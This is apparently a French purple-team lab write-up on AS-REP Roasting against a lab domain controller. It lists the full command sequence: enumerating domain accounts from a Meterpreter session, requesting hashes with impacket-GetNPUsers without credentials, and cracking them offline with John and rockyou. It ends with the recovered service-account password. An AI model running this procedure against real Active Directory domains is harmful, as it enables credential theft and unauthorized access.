## Attaque

### Contexte

Le compte `svc-backup` a la pré-authentification Kerberos désactivée (No pre-auth).
Sans pré-authentification, le KDC répond à n'importe quelle demande de TGT sans
vérifier que le demandeur connaît le mot de passe. Le hash du TGT peut être cracké offline.

> Dans ce lab Kali partage le réseau avec le DC, ce qui permet de lancer l'attaque directement. En conditions réelles elle serait exécutée depuis la machine compromise via Rubeus, ou depuis le C2 via un tunnel SOCKS.

### Technique MITRE

| ID | Technique | Tactique |
|----|-----------|----------|
| T1558.004 | AS-REP Roasting | Credential Access |

### Prérequis

| Élément | Valeur |
|---------|--------|
| Accès | Aucun credential nécessaire |
| Cible | DC01 -> 192.168.10.100 |
| Condition | svc-backup doit avoir DoesNotRequirePreAuth activé |

### Exécution

#### 1. Découverte des comptes du domaine (WS01)

Depuis la session Meterpreter :

```cmd
net user /domain
```

Les comptes de service `svc-backup`, `svc-web`, `svc-sync` sont visibles.

#### 2. Identifier les comptes sans pré-authentification (Kali)

Créer un fichier avec les comptes à tester :

```bash
nano ~/lab_purple_team/users.txt

cat ~/lab_purple_team/users.txt
alice
svc-web
svc-backup
svc-sync
```

Lancer GetNPUsers :

```bash
impacket-GetNPUsers lab.local/ -usersfile ~/lab_purple_team/users.txt -dc-ip 192.168.10.100 -no-pass
```

![[asrep_hash_capture.png]]

`svc-backup` est vulnérable, le hash AS-REP est retourné.

#### 3. Cracker le hash offline

```bash
john ~/lab_purple_team/svc-backup_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
```

| Paramètre | Signification |
|-----------|--------------|
| `--format=krb5asrep` | Format AS-REP Kerberos etype 23 |
| `--wordlist` | Dictionnaire rockyou |

![[asrep_cracked.png]]

### Résultat

| Compte | Mot de passe |
|--------|-------------|
| svc-backup | P@ssw0rd123 |